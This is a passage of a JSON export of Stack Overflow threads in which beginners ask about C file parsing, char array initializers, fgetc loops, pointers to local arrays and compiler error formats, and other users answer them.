parse_word(&amp;content[line_num][0],line_num);\n\n        }\n        print_result();\n        return(0);\n}\n</code></pre>\n\n<p><a href=\"https://stackoverflow.com/questions/4513316/split-string-in-c-every-white-space\">strtok usage example</a></p>\n"}], "owner": {"reputation": 49, "user_id": 10649711, "user_type": "registered", "profile_image": "https://graph.facebook.com/316425832510594/picture?type=large", "display_name": "Aleksandre Sikharulidze", "link": "https://stackoverflow.com/users/10649711/aleksandre-sikharulidze"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 2, "accepted_answer_id": 53319021, "answer_count": 2, "score": 1, "last_activity_date": 1542283119, "creation_date": 1542167622, "question_id": 53292968, "link": "https://stackoverflow.com/questions/53292968/c-file-with-both-integer-and-string-division-problems", "title": "C - File with both Integer and String (Division Problems)", "body": "<p>I have a task, I am working with few days already, I am going crazy, Google doesn't help, only choice is to ask here.</p>\n\n<p>I am a total beginner in C.</p>\n\n<p>I have a file, ordinary .txt file.</p>\n\n<pre><code>Mathematics 5 1 2 3 4 5\nPhysics 6 1 2 3 4 5 6\nDesign 7 1 2 3 4 5 6 7\n</code></pre>\n\n<p>First word is a \"course\", first number is the amount of grades that are in this course, for example Math, first number is 5 and I have 5 grades, 1 2 3 4 5, same with other courses.</p>\n\n<p>I need to create 3 different arrays.</p>\n\n<ol>\n<li><p>Array of courses (\"Mathematics\", \"Physics\", \"Design\") and of course not with hands, but by taking all of these from FILE. </p></li>\n<li><p>Array of amount of grades (First number on each line),</p></li>\n<li><p>Array of average grades (All numbers except the first one on each line),</p></li>\n</ol>\n\n<p>MY MAIN PROBLEM:</p>\n\n<p>I can't divide my .txt file so that I get only string (Mathematics, Physics and Design).</p>\n\n<p>Here is my code, most logical things I came up with, but fscanf unfortunately tells me that I can't convert STRING to INTEGER.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n\nint main () {\nFILE *fp;\nfp = fopen(\"C:\\\\Project\\\\project.txt\", \"r\"); //opening already created file\nint grades[500];\nchar courses[300];\n\nfor (int i = 0; i &lt; 300; ++i) {\n    fscanf(fp, \"%s\", &amp;courses[i]);\n    if(isdigit(courses[i]))\n    fscanf(fp, \"%d\", &amp;grades[i]);\n}\n\nfclose(fp);\nreturn(0);\n}\n</code></pre>\n\n<p>Basically this code doesn't work. Program thinks about text in the file as String, I try to take it out as char and later send it to its respective arrays, but I physically can't do it.</p>\n\n<p>Once again, First I need to take those course names, \"Mathematics\", \"Physics\" and \"Design\" as string and later to move on to numbers.</p>\n\n<p>Thanks in advance</p>\n"}, {"tags": ["c", "string", "literals", "initializer", "psoc"], "comments": [{"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 1, "creation_date": 1542165705, "post_id": 53292705, "comment_id": 93466803, "body": "this line: <code>char strNum[3] = 0;</code> is a problem. The variable on the left is an array of chars with three elements.  The initializer on the right is a a scalar int.  They types do not match.  Try putting the initializer in curly braces which will assign 0 to each element, like this: <code>char strNum[3] = {0};</code>"}, {"owner": {"reputation": 855, "user_id": 3659239, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3b6ed436c73d42ba39748209936b7e7?s=128&d=identicon&r=PG&f=1", "display_name": "Sandy", "link": "https://stackoverflow.com/users/3659239/sandy"}, "reply_to_user": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 1, "creation_date": 1542166344, "post_id": 53292705, "comment_id": 93466908, "body": "@bruceg Such a nice explanation. This should go in as an answer."}, {"owner": {"reputation": 3, "user_id": 10649572, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-I6qHR2bPojU/AAAAAAAAAAI/AAAAAAAAANQ/NpzANDPiaYI/photo.jpg?sz=128", "display_name": "Sulaiman Alsuhaimi", "link": "https://stackoverflow.com/users/10649572/sulaiman-alsuhaimi"}, "reply_to_user": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 1, "creation_date": 1542173759, "post_id": 53292705, "comment_id": 93468608, "body": "Great @bruceg , thanks!"}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1542167008, "post_id": 53292802, "comment_id": 93467013, "body": "Detail: Although all 3 array elements are initialized to zero, the <i>string</i> is only 1 character: <code>strNum[0]</code>."}, {"owner": {"reputation": 3, "user_id": 10649572, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-I6qHR2bPojU/AAAAAAAAAAI/AAAAAAAAANQ/NpzANDPiaYI/photo.jpg?sz=128", "display_name": "Sulaiman Alsuhaimi", "link": "https://stackoverflow.com/users/10649572/sulaiman-alsuhaimi"}, "edited": false, "score": 0, "creation_date": 1542173422, "post_id": 53292802, "comment_id": 93468522, "body": "Awesome! I changed it to char strNum[3] = &quot;0&quot;; and got it working. Will this affect my code if I keep it like this or you are just explaining to me?"}, {"owner": {"reputation": 1058, "user_id": 2438650, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55c2b3926bd8282c899903b32a6f002b?s=128&d=identicon&r=PG", "display_name": "lod", "link": "https://stackoverflow.com/users/2438650/lod"}, "edited": false, "score": 0, "creation_date": 1542174207, "post_id": 53292802, "comment_id": 93468736, "body": "No, it is a perfectly valid piece of code. Keep in mind that it is a string representation of a number, not a number. You can&#39;t increment it or modify it like you would a number. If you have issues with that it would be best to ask another question."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1542196749, "post_id": 53292802, "comment_id": 93480036, "body": "If your statement \u201cIt must also be initialised as a string\u201d is meant to say that an array of <code>char</code> must be initialized with a string literal, then it is incorrect. As the compiler message notes, it may be initialized with an initializer list (enclosed in braces), such as <code>{ 2, 1, 0 }</code> or <code>{ &#39;a&#39;, &#39;b&#39;, 0 }</code>."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1542198038, "post_id": 53292802, "comment_id": 93480737, "body": "<code>char strNum[3] = 0;</code> doesn&#39;t create jack, it is not valid C. Hence the compiler error."}], "tags": [], "owner": {"reputation": 1058, "user_id": 2438650, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55c2b3926bd8282c899903b32a6f002b?s=128&d=identicon&r=PG", "display_name": "lod", "link": "https://stackoverflow.com/users/2438650/lod"}, "is_accepted": true, "score": 0, "last_activity_date": 1542166360, "creation_date": 1542166360, "answer_id": 53292802, "question_id": 53292705, "link": "https://stackoverflow.com/questions/53292705/array-initializer-must-be-an-initializer-list-or-string-literal-c/53292802#53292802", "title": "array initializer must be an initializer list or string literal c", "body": "<pre><code>char strNum[3] = 0;\n</code></pre>\n\n<p>This line creates a three character string. You then use it as a string with the function strlen and the uart_send.</p>\n\n<p>As a C string it must be terminated with a null character, so you only have two usable characters. It must also be initialised as a string, the compiler is telling you that you haven't done this correctly.</p>\n\n<p>Try something like one of these lines</p>\n\n<pre><code>char strNum[3] = \"\"; // Empty string\nchar strNum[3] = \"AB\"; // Full string\nchar strNum[3] = \"0\"; // String holding the character zero\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 10649572, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-I6qHR2bPojU/AAAAAAAAAAI/AAAAAAAAANQ/NpzANDPiaYI/photo.jpg?sz=128", "display_name": "Sulaiman Alsuhaimi", "link": "https://stackoverflow.com/users/10649572/sulaiman-alsuhaimi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1717, "favorite_count": 1, "accepted_answer_id": 53292802, "answer_count": 1, "score": 0, "last_activity_date": 1542173582, "creation_date": 1542165499, "last_edit_date": 1542173582, "question_id": 53292705, "link": "https://stackoverflow.com/questions/53292705/array-initializer-must-be-an-initializer-list-or-string-literal-c", "title": "array initializer must be an initializer list or string literal c", "body": "<p>I am newbie in C. I do not know why I am getting this error and how to fix it?</p>\n\n<pre><code>void FPS_PRINT_ENROLLED(){\n  int checkNum = 0;\n  int ID = 0;\n  int num_Enroll = 0;\n  num_Enroll = Available_ID();\n  char strNum[3] = 0;\n  itoa(num_Enroll, strNum);\n  uint32_t numLen = strlen((char *)strNum);\n  UART_send_A3(\"Number of Stored Prints: \", 25);\n  UART_send_A3(&amp;strNum, numLen);\n  }\n</code></pre>\n\n<p>The error message is: <code>array initializer must be an initializer list or string literal</code></p>\n\n<p>Please see the attached screenshot of the error message. Also, the c file is attached.</p>\n\n<p><img src=\"https://i.stack.imgur.com/UKgfpt.jpg\" alt=\"Screenshot of error message\"></p>\n\n<p>By the way, this is in PSoC Creator 4.1 which uses C language.</p>\n\n<p><a href=\"https://drive.google.com/file/d/18hkazAqgAYeCS2XDVbKH8kMdib_nvS8d/view?usp=sharing\" rel=\"nofollow noreferrer\">code file download link through GoogleDrive</a></p>\n"}, {"tags": ["c", "loops", "fgetc"], "answers": [{"tags": [], "owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 2, "last_activity_date": 1542164997, "creation_date": 1542164997, "answer_id": 53292645, "question_id": 53292547, "link": "https://stackoverflow.com/questions/53292547/weird-loop-while-reading-from-a-file-in-c/53292645#53292645", "title": "Weird loop while reading from a file in C", "body": "<p>The problem is here.</p>\n\n<pre><code>   for (i = 0; ((i &lt; N) &amp;&amp; (temp = fgetc(arquivo)) != '\\n') ; i++) {\n        for (j = 0; j &lt; N; j++) {\n            A[i][j] = temp;\n        }\n    }\n</code></pre>\n\n<p>The loop will exit once it sees a newline and start the <code>while</code> loop again.</p>\n\n<p>Instead you want to read N lines.</p>\n\n<pre><code>    for (i = 0; i &lt; N; i++) {\n        for(j = 0; (temp = fgetc(arquivo)) != '\\n'; j++ ) {\n            A[i][j] = temp;\n        }\n    }\n</code></pre>\n"}], "owner": {"reputation": 127, "user_id": 10649481, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ad4bcc281cc9317bb20295bd92066a6?s=128&d=identicon&r=PG&f=1", "display_name": "Lucas", "link": "https://stackoverflow.com/users/10649481/lucas"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 96, "favorite_count": 1, "accepted_answer_id": 53292645, "answer_count": 1, "score": 0, "last_activity_date": 1542164997, "creation_date": 1542164284, "question_id": 53292547, "link": "https://stackoverflow.com/questions/53292547/weird-loop-while-reading-from-a-file-in-c", "title": "Weird loop while reading from a file in C", "body": "<p>I'm writing a code in C to read matrixes (square matrix with 3 &lt;= dim &lt;= 9) from a .txt file and print it exactly how it is written. The file is arranged as follows:</p>\n\n<pre><code>5\nAAAAA\nAAAAA\nAAAAA\nAAAAA\nAAAAA\n6\nXXXXXX\nXXXXXX\nXXXXXX\nXXXXXX\nXXXXXX\nXXXXXX\n</code></pre>\n\n<p>The first number indicates the size of the subsequent matrix.</p>\n\n<p>I wrote the following code:</p>\n\n<pre><code>int main () {\n    FILE *arquivo;\n    char A[9][9];\n    int N;\n    int i,j;\n    char temp;\n    arquivo = fopen(\"matrizes.txt\", \"r\");\n    if (!arquivo) printf(\"Erro.\\n\");\n    while (fscanf(arquivo, \"%d\", &amp;N) != EOF) {   \n        printf(\"%d \\n\", N);\n        fgetc(arquivo);\n        for (i = 0; ((i &lt; N) &amp;&amp; (temp = fgetc(arquivo)) != '\\n') ; i++) {\n            for (j = 0; j &lt; N; j++) {\n                A[i][j] = temp;\n            }\n        }\n        for (i = 0; i &lt; N; i++) {\n            for(j = 0; j&lt;N; j++) {\n                printf(\"%c\", A[i][j]);\n            }\n            puts(\" \");\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>The output is this</p>\n\n<pre><code>5 \nAAAAA \nAAAAA \nAAAAA \nAAAAA \nAAAAA \n5 \nAAAAA \nAAAAA \nAAAAA \nAAAAA \nAAAAA \n5 \nAAAAA \nAAAAA \nAAAAA \nAAAAA \nAAAAA \n5 \nAAAAA \nAAAAA \nAAAAA \nAAAAA \nAAAAA \n5 \nAAAAA \nAAAAA \nAAAAA \nAAAAA \nAAAAA \n6 \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \n6 \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \n6 \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \n6 \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \n6 \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \n6 \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \nXXXXXX \n</code></pre>\n\n<p>I honestly have no idea why this is happening. I tried different conditions to stop the loop, bot none of them worked out. </p>\n\n<p>If I change </p>\n\n<blockquote>\n  <p>while (fscanf(arquivo, \"%d\", &amp;N) != EOF) </p>\n</blockquote>\n\n<p>into</p>\n\n<blockquote>\n  <p>while (fscanf(arquivo, \"%d\", &amp;N) == 1)</p>\n</blockquote>\n\n<p>the output is just</p>\n\n<pre><code>5\nAAAAA\nAAAAA\nAAAAA\nAAAAA\nAAAAA\n</code></pre>\n\n<p>The value of the second loop scanf in this case is \"0\". \nHow can I fix it and print exactly what is written on the file?</p>\n\n<p>By the way, I know there are other forms to print a .txt exactly how it is made, I mean, I don't need 2D arrays to do this. However, I will use this program to read several matrixes and do some tests with them (also I want to print them as well), so I really need to store the data in a matrix of characters.  </p>\n"}, {"tags": ["c", "string", "pointers", "char", "c99"], "comments": [{"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1542163784, "post_id": 53292447, "comment_id": 93466364, "body": "You need to allocate memory for the string and copy it into that allocated memory. You&#39;re just pointing to a variable that immediately goes out of scope. You can probably use <code>strdup</code> or do it manually.  I will say there&#39;s a lot of assumptions being made in your code about lengths. It would be very easy to access outside the bounds of the memory you&#39;ve allocated."}, {"owner": {"reputation": 37, "user_id": 10421378, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/43ebd9b8d58babde3a6583f6c5dc0ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Jak", "link": "https://stackoverflow.com/users/10421378/jak"}, "reply_to_user": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1542164648, "post_id": 53292447, "comment_id": 93466584, "body": "I added a new variable char *pCar = strdup(car); and made newRacer-&gt;graphic = pCar... but I am still seg faulting. hmmmmm"}, {"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1542164827, "post_id": 53292447, "comment_id": 93466624, "body": "Consider a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> because the problem could very likely be in the code you have not shown, and we&#39;d be able to see things like what MAX_CAR_LEN is."}, {"owner": {"reputation": 37, "user_id": 10421378, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/43ebd9b8d58babde3a6583f6c5dc0ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Jak", "link": "https://stackoverflow.com/users/10421378/jak"}, "reply_to_user": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1542164944, "post_id": 53292447, "comment_id": 93466644, "body": "Okay I will update it now. Sorry about that"}, {"owner": {"reputation": 37, "user_id": 10421378, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/43ebd9b8d58babde3a6583f6c5dc0ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Jak", "link": "https://stackoverflow.com/users/10421378/jak"}, "reply_to_user": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1542170271, "post_id": 53292447, "comment_id": 93467682, "body": "It has been updated"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1542387896, "post_id": 53292447, "comment_id": 93563640, "body": "When you modify <code>car</code>, after adding <code>car[MAX_CAR_LEN-1] = &#39;&gt;&#39;;</code>, (which overwrites the final <i>nul-byte</i>) you fail to <i>nul-terminate</i> <code>car</code> by setting <code>car[MAX_CAR_LEN-1] = 0;</code> so you do not have a valid string in <code>car</code>, you simply have unterminated an <i>array of</i> <code>char</code>. When you then call <code>strdup(car);</code>, you invoke <i>Undefined Behavior</i> by passing an unterminated string to <code>strdup</code> which then happily runs off past the end of your array looking for the terminating character reading from memory you do not own... Fix <code>char car[MAX_CAR_LEN+1] = &quot;~O=&quot;;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 10421378, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/43ebd9b8d58babde3a6583f6c5dc0ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Jak", "link": "https://stackoverflow.com/users/10421378/jak"}, "edited": false, "score": 0, "creation_date": 1542218296, "post_id": 53293602, "comment_id": 93493118, "body": "I am still getting the error even with the fixes :/"}, {"owner": {"reputation": 37, "user_id": 10421378, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/43ebd9b8d58babde3a6583f6c5dc0ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Jak", "link": "https://stackoverflow.com/users/10421378/jak"}, "edited": false, "score": 0, "creation_date": 1542218490, "post_id": 53293602, "comment_id": 93493181, "body": "I have updated my code above for your reference. I would really appreciate  it if you could check it over"}, {"owner": {"reputation": 775, "user_id": 4650806, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/797558543615184/picture?type=large", "display_name": "BEPP", "link": "https://stackoverflow.com/users/4650806/bepp"}, "reply_to_user": {"reputation": 37, "user_id": 10421378, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/43ebd9b8d58babde3a6583f6c5dc0ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Jak", "link": "https://stackoverflow.com/users/10421378/jak"}, "edited": false, "score": 0, "creation_date": 1542387267, "post_id": 53293602, "comment_id": 93563310, "body": "@Jak, you have to copy the content to allocated memory. memory allocated for &quot;car&quot; will be freed up.  please check my updated answer."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1542388251, "post_id": 53293602, "comment_id": 93563805, "body": "@NaveenKumar - have a look at my comment under the question and see if you can fix the problem with <code>car</code> before <code>strdup</code> is called. Also <code>newRacer-&gt;graphic = &amp;car[0];</code> is wrong because it assigns the address of an array created local to <code>make_racer()</code> which then goes out of scope on the function return. Seems like it should be <code>newRacer-&gt;graphic = pCar;</code>"}], "tags": [], "owner": {"reputation": 775, "user_id": 4650806, "user_type": "registered", "accept_rate": 71, "profile_image": "https://graph.facebook.com/797558543615184/picture?type=large", "display_name": "BEPP", "link": "https://stackoverflow.com/users/4650806/bepp"}, "is_accepted": false, "score": 0, "last_activity_date": 1542388056, "last_edit_date": 1542388056, "creation_date": 1542172647, "answer_id": 53293602, "question_id": 53292447, "link": "https://stackoverflow.com/questions/53292447/when-accessing-my-graphic-in-my-struct-it-prints-an-empty-line/53293602#53293602", "title": "When accessing my graphic in my struct it prints an empty line", "body": "<p>You have mentioned the below statement in your question. </p>\n\n<blockquote>\n  <p>This is the code I am running in my main to test it</p>\n\n<pre><code>acer *t = make_racer(\"Tom\", 4);\nprintf(\"%s\\n\", t-&gt;graphic);\n</code></pre>\n</blockquote>\n\n<p>In <strong>make_racer</strong> function you have used a local charecter array variable called <strong>car</strong> and assigned the address to <strong>newRacer->graphic</strong> . This variable(char car[MAX_CAR_LEN+1] ;) memory goes out of scope after returning from the function.</p>\n\n<p>Please refer <a href=\"https://stackoverflow.com/questions/22527846/scope-and-lifetime-of-local-variables-in-c\">this thread</a> to understand more about the local scope in C. </p>\n\n<p>Now to resolve your problem, In <strong>make_racer</strong> function you have to dynamically allocate memory for  <strong>newRacer->graphic</strong> as well.</p>\n\n<pre><code>Racer * make_racer( char *name, int row ){\n:\n    Racer *newRacer = malloc(sizeof(*newRacer));\n    newRacer-&gt;graphic = (char*)malloc(MAX_CAR_LEN+1);\n:\n    //newRacer-&gt;graphic = &amp;car[0]; # this is wrong.\n    strcpy(newRacer-&gt;graphic,car); //copy the content to allocated memory.\n\n    /*\n     * Warning:Just i am pointing out the issue here. \n     *    strcpy may cause buffer over run. \n     *    You have to use snprintf/strncpy family to prevent buffer overrun.\n     */\n}\n</code></pre>\n\n<p>Make sure you free the memory in your main.</p>\n\n<pre><code>int main() {\n:\n    free(newRacer-&gt;graphic);    //before free the momory for \"newRacer\"\n    free(newRacer);\n}\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 10421378, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/43ebd9b8d58babde3a6583f6c5dc0ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Jak", "link": "https://stackoverflow.com/users/10421378/jak"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 45, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542388056, "creation_date": 1542163478, "last_edit_date": 1542218458, "question_id": 53292447, "link": "https://stackoverflow.com/questions/53292447/when-accessing-my-graphic-in-my-struct-it-prints-an-empty-line", "title": "When accessing my graphic in my struct it prints an empty line", "body": "<p>Here is the struct that I am using.</p>\n\n<pre><code>#define MAX_CAR_LEN 12    ///&lt; length does not include the trailing NUL byte\n\n\n/// Racer_S structure represents a racer's row, position and display graphic.\n\n    typedef struct Racer_S {\n\n        int row;       ///&lt; vertical row or \"racing lane\" of a racer\n\n        int distance;  ///&lt; column of rear of car, marking its position in race\n\n        char *graphic; ///&lt; graphic is the drawable text of the racer figure\n\n    } Racer;\n</code></pre>\n\n<p>When I call this function everything works fine inside it and creates everything correctly. I am able to access the row and distance fine. When I try and print the graphic I am printed an empty row in my terminal. I believe that this might be because \"graphic\" in the struct is a char* but I assign it a fixed sized array of char. When this function is called and passed in the name \"Tom\", graphic is supposed to be \"~O=Tom----o>\". I am new to C what am I doing wrong?</p>\n\n<pre><code>Racer * make_racer( char *name, int row ){\n    //Creating a newRacer instance\n    Racer *newRacer = malloc(sizeof(*newRacer));\n    newRacer-&gt;graphic = (char*)malloc(MAX_CAR_LEN);\n    char car[MAX_CAR_LEN] = \"~O=\";     //\"~O=-------o&gt;\"\n    char *pCar;\n    int length = strlen(name) + 2;\n    //Add the name after the engine of the car\n    for (int i = 0; i &lt; length; ++i)\n        car[i+3] = name[i];\n    //Calculate the amount of dashes needed\n    int printDashes = 7 - strlen(name);\n    //add the extra dashes\n    for (int j = 1; j &lt;= printDashes; ++j)\n        car[length + j] = '-';\n\n    // creates the end of the car\n    car[MAX_CAR_LEN-2] = 'o';\n    car[MAX_CAR_LEN-1] = '&gt;';\n    pCar = strdup(car);\n\n    newRacer-&gt;row = row;\n    newRacer-&gt;distance = 0;\n    newRacer-&gt;graphic = &amp;car[0];\n//    printf(\"%s\\n\", car);\n    return newRacer;\n}\n</code></pre>\n\n<p>This is the code I am running in my main to test it</p>\n\n<pre><code>Racer *t = make_racer(\"Tom\", 4);\nprintf(\"%s\\n\", t-&gt;graphic);\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12557, "user_id": 1270789, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/FXwoB.png?s=128&g=1", "display_name": "Ken Y-N", "link": "https://stackoverflow.com/users/1270789/ken-y-n"}, "edited": false, "score": 1, "creation_date": 1542162810, "post_id": 53292353, "comment_id": 93466156, "body": "It means it cannot combine the <code>int</code> with a <code>void</code>, not the <code>void</code> with a previous undisplayed <code>void</code>. And <code>void int</code> is a colourless green declaration."}], "answers": [{"comments": [{"owner": {"reputation": 12557, "user_id": 1270789, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/FXwoB.png?s=128&g=1", "display_name": "Ken Y-N", "link": "https://stackoverflow.com/users/1270789/ken-y-n"}, "edited": false, "score": 0, "creation_date": 1542162937, "post_id": 53292384, "comment_id": 93466188, "body": "This is a comment, not an answer."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2404501"}, "reply_to_user": {"reputation": 12557, "user_id": 1270789, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/FXwoB.png?s=128&g=1", "display_name": "Ken Y-N", "link": "https://stackoverflow.com/users/1270789/ken-y-n"}, "edited": false, "score": 0, "creation_date": 1542163024, "post_id": 53292384, "comment_id": 93466204, "body": "I dispute that this answer would be better if it was longer. I considered leaving it at the first line!"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2404501"}, "reply_to_user": {"reputation": 12557, "user_id": 1270789, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/FXwoB.png?s=128&g=1", "display_name": "Ken Y-N", "link": "https://stackoverflow.com/users/1270789/ken-y-n"}, "edited": false, "score": 0, "creation_date": 1542163143, "post_id": 53292384, "comment_id": 93466225, "body": "(The question contains some bad English grammar, but I&#39;m fairly certain it <i>is</i> asking how to interpret the numbers in the error message, and there is no actual doubt about the validity of <code>void int int int</code>)"}, {"owner": {"reputation": 13306, "user_id": 162698, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/HnjBG.png?s=128&g=1", "display_name": "Rob", "link": "https://stackoverflow.com/users/162698/rob"}, "edited": false, "score": 0, "creation_date": 1542164373, "post_id": 53292384, "comment_id": 93466511, "body": "The problem with your answer is 1) you are answering an off topic question which supplies no code. 2) You give no explanation of how this answers the question. It&#39;s just blurting words out with no meaning. That&#39;s not what SO is about."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2404501"}, "is_accepted": true, "score": 1, "last_activity_date": 1542162850, "creation_date": 1542162850, "answer_id": 53292384, "question_id": 53292353, "link": "https://stackoverflow.com/questions/53292353/read-compile-error-report-format-format-io-c310/53292384#53292384", "title": "Read compile error report format: format_io.c:3:10:", "body": "<p><em>filename</em>:<em>line</em>:<em>column</em></p>\n\n<p>Column 6 of line 3. And column 10 of line 3.</p>\n"}], "owner": {"reputation": 13851, "user_id": 7301792, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/K6k1M.png?s=128&g=1", "display_name": "AbstProcDo", "link": "https://stackoverflow.com/users/7301792/abstprocdo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 26, "favorite_count": 0, "accepted_answer_id": 53292384, "answer_count": 1, "score": -1, "last_activity_date": 1542162892, "creation_date": 1542162614, "last_edit_date": 1542162892, "question_id": 53292353, "link": "https://stackoverflow.com/questions/53292353/read-compile-error-report-format-format-io-c310", "title": "Read compile error report format: format_io.c:3:10:", "body": "<p>I compiled a program and get</p>\n\n<pre><code>format_io.c:3:6: error: cannot combine with previous 'void' declaration specifier\nvoid int int int\n     ^\nformat_io.c:3:10: error: cannot combine with previous 'void' declaration specifier\nvoid int 